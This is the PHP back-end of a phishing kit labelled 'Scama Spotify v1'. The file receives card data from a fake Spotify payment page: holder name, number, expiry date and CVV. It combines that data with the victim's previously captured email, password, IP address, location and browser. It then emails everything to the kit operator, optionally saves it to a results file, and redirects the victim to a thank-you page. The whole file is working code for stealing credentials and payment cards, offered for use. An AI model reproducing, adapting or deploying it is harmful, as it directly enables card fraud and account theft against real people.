<?php
/*
 $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\      $$$$$$$$\ $$\   $$\ 
$$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |     \__$$  __|$$$\  $$ |
$$ /  $$ |$$ |  $$ |$$ /  $$ |$$$$\ $$ |        $$ |   $$$$\ $$ |
$$$$$$$$ |$$$$$$$  |$$ |  $$ |$$ $$\$$ |$$$$$$\ $$ |   $$ $$\$$ |
$$  __$$ |$$  __$$< $$ |  $$ |$$ \$$$$ |\______|$$ |   $$ \$$$$ |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |        $$ |   $$ |\$$$ |
$$ |  $$ |$$ |  $$ | $$$$$$  |$$ | \$$ |        $$ |   $$ | \$$ |
\__|  \__|\__|  \__| \______/ \__|  \__|        \__|   \__|  \__|
                                                                 
#==========================================#
#             Scama Spotify v1             #
#       facebook: fb.com/amyr.gov.tn       #
#==========================================#

 $$$$$$\   $$$$$$\    $$\   $$$$$$\  
$$  __$$\ $$$ __$$\ $$$$ | $$  __$$\ 
\__/  $$ |$$$$\ $$ |\_$$ | $$ /  $$ |
 $$$$$$  |$$\$$\$$ |  $$ | \$$$$$$$ |
$$  ____/ $$ \$$$$ |  $$ |  \____$$ |
$$ |      $$ |\$$$ |  $$ | $$\   $$ |
$$$$$$$$\ \$$$$$$  /$$$$$$\\$$$$$$  |
\________| \______/ \______|\______/ 
*/     
session_start();
error_reporting(0);
$TIME_DATE = date('H:i:s d/m/Y');
include('../../../../Email.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');
$_SESSION['_holder_']    = $_POST['cc_holder'];
$_SESSION['_cc_']    = $_POST['cc_number'];
$_SESSION['_exp_m']     = $_POST['expirationM'];
$_SESSION['_exp_y']     = $_POST['expirationY'];
$_SESSION['_cvv_']     = $_POST['cvv'];
if(!empty($_POST['cc_holder'])){$_SESSION['_holder_']         = $_POST['cc_holder'];}
if(!empty($_POST['cc_number'])){$_SESSION['_cc_']         = $_POST['cc_number'];}
if(!empty($_POST['cc_number'])){$_SESSION['_last4_']             = substr($_POST['cc_number'], -4);}
if(!empty($_POST['expirationM'])){$_SESSION['_exp_m']    = $_POST['expirationM'];}
if(!empty($_POST['expirationY'])){$_SESSION['_exp_y']    = $_POST['expirationY'];}
if(!empty($_POST['cvv'])){$_SESSION['_cvv_']               = $_POST['cvv'];}
$aron_message="<html>
        <head><meta charset=\"UTF-8\"></head>
        <div style='font-size:13px;font-family:monospace'>";
$aron_message.="<b><font color='#cc1414'></font> ●••۰۰•● ❤ ●•۰۰•● ❤ DEAR ME, THIS IS YOUR CARD RESULT ENJOY ! ❤ ●•۰۰•● ❤ ●•۰۰•● </b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘💌</font> <font color='#146607'>[EMAIL]</font></b>             :<b>".$_SESSION['_login_email_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘🔐</font> <font color='#146607'>[PASSWORD]</font></b>          :<b>".$_SESSION['_login_password_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘👨</font> <font color='#146607'>[Card Holder's Name]</font></b>       :<b>".$_SESSION['_holder_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘💳</font> <font color='#146607'>[Card Number]</font></b>       :<b>".$_SESSION['_cc_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘⏳</font> <font color='#146607'>[Expiration Date]</font></b>  :<b>".$_SESSION['_exp_m']."/".$_SESSION['_exp_y']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘🔒</font> <font color='#146607'>[Card Security Code]</font></b>:<b>".$_SESSION['_cvv_']."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘🍁</font> <font color='#146607'>[IP]</font></b>              :<a href='https://db-ip.com/".$_SESSION['_ip_']."' target='_blank'>".$_SESSION['_ip_']." (Click for more information)</a> <br>";
$aron_message.="<b><font color='#cc1414'>✘💒</font> <font color='#146607'>[CITY]</font></b>         : <b> ".$_SESSION['_LOOKUP_CITY_']." </b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘🏤</font> <font color='#146607'>[STATE]</font></b>         : <b> ".$_SESSION['_LOOKUP_REGIONS_']." </b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘📫</font> <font color='#146607'>[ZIPCODE]</font></b>         : <b> ".$_SESSION['_LOOKUP_ZIPCODE_']." </b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘🚩</font> <font color='#146607'>[COUNTRY]</font></b>         : <b> ".$_SESSION['_LOOKUP_COUNTRY_']." </b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘🌀</font> <font color='#146607'>[BROWSER & OS]</font></b>    : <b>".ARON_Browser($_SERVER['HTTP_USER_AGENT'])." On ".ARON_OS($_SERVER['HTTP_USER_AGENT'])."</b> <br>\n";
$aron_message.="<b><font color='#cc1414'>✘🕘</font> <font color='#146607'>[TIME]</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br>\n";
$aron_subject = "💳 💳 💳 Credit or debit card 💳 💳 💳 (".$_SESSION['_login_email_'].")(".$_SESSION['_forlogin_'].")";
$aron_headers  = "From: Mr-Spot! <no_reply@mrspoti.net>\n";
$aron_headers .= "MIME-Version: 1.0\r\n";
$aron_headers .= "Content-Type: text/html; charset=ISO-8859-1\n";
@mail($aronxmail, $aron_subject, $aron_message, $aron_headers);
if ($aronxsave=='on') {
    $save=fopen("../../../../ARONxADMIN/RZLT_CCs.html","a+");
    fwrite($save,$aron_message);
    fclose($save);
}
HEADER("Location: ../thanks/?secure_code=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
?>